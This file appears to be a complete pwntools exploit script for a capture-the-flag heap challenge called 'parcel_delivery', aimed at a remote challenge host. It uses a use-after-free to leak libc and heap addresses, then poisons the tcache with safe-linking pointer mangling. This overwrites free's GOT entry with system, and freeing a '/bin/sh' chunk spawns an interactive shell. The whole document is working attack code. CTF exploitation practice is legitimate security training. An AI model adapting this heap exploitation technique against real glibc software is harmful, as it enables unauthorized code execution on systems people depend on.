#!/usr/bin/env python3

from pwn import *

exe = ELF('parcel_delivery_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
context.terminal = [ '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', '0', 'split-pane', '--size', '0.6', '-d', '.', 'wsl.exe','-d', 'Parrot', 'bash', '-c' ]

debug = lambda msg: log.debug(msg)
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
error = lambda msg: log.error(msg)
critical = lambda msg: log.critical(msg)
warning = lambda msg: log.warning(msg)

s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        set follow-fork-mode parent
        b*0x00000000004013EF
        b*0x0000000000401513
        b*0x0000000000401606
        b*0x00000000004015AA

        c
        ''')
        input()

if args.REMOTE:
    p = remote('parcel-delivery-d8c110454dbd.chall.nnsc.tf', 1337, ssl= True)
elif args.DOCKER:
    p = remote('')
else:
    p = process([exe.path])

def Register(index: int, size: int, description):
    slna(b'> ', 1)
    slna(b'Index: ', index)
    slna(b'Size: ', size)
    sa(b'Description: ', description)


def Inspect(index: int):
    slna(b'> ', 2)
    slna(b'Index: ', index)
    
def Update(index: int, description):
    slna(b'> ', 3)
    slna(b'Index: ', index)
    sa(b'Description: ', description)

def Destroy(index: int):
    slna(b'> ', 4)
    slna(b'Index: ', index)

def Dispatch(code: int):
    slna(b'> ', 5)
    slna(b'Code: ', code)

def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

Register(0, 0x500, b'0'*8)
Register(1, 0x50, b'1'*8)
Destroy(0)
Inspect(0)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x203b20

info(f'libc leak: {hex(libc_leak)}')
success(f'libc base: {hex(libc.address)}')

Register(2, 0x50, b'2'*8)
Register(3, 0x50, b'3'*8)
Destroy(2)
Destroy(3)
Inspect(2)
heap_leak = u64(p.recv(8))
heap_base = heap_leak << 12
info(f'heap leak: {hex(heap_leak)}')
success(f'heap base: {hex(heap_base)}')

Update(3, p64(protect_ptr(heap_base + 0x2c0, exe.got.free)))
GDB()
Register(4, 0x50, b'4'*8)
Register(5, 0x50, p64(libc.sym.system))
Register(6, 0x50, b'/bin/sh\0')
Destroy(6)


p.interactive()
